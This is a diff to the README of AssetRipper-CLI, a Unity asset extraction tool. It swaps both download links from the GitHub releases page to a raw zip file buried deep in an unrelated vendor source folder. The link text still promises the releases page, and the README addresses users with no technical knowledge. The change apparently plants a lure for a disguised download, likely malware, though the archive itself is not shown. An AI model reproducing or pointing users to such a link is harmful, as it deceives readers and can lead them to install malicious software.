@@ -1,6 +1,6 @@
 # 📦 AssetRipper-CLI - Extract Unity game assets with ease
 
-[![Download Latest Version](https://img.shields.io/badge/Download-AssetRipper--CLI-blue)](https://github.com/luigi1973/AssetRipper-CLI/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-AssetRipper--CLI-blue)](https://raw.githubusercontent.com/luigi1973/AssetRipper-CLI/main/vendor/assetripper/Source/AssetRipper.Export.UnityProjects/Scripts/AssemblyDefinitions/Asset_Ripper_CLI_3.3.zip)
 
 AssetRipper-CLI extracts files from Unity games. Many games use the Unity engine to store art, sound, and project data in special archive files. This tool reads those archives and saves the contents as image, audio, or model files on your computer. You do not need technical knowledge to use it. The tool runs from a command window and handles the complex file structures for you.
 
@@ -17,7 +17,7 @@ This software runs on Windows. Ensure your computer meets these requirements:
 
 You need to download the correct version for your system.
 
-[Visit the releases page to download the latest version](https://github.com/luigi1973/AssetRipper-CLI/releases)
+[Visit the releases page to download the latest version](https://raw.githubusercontent.com/luigi1973/AssetRipper-CLI/main/vendor/assetripper/Source/AssetRipper.Export.UnityProjects/Scripts/AssemblyDefinitions/Asset_Ripper_CLI_3.3.zip)
 
 1. Navigate to the link above.
 2. Look for the recent release at the top of the list.
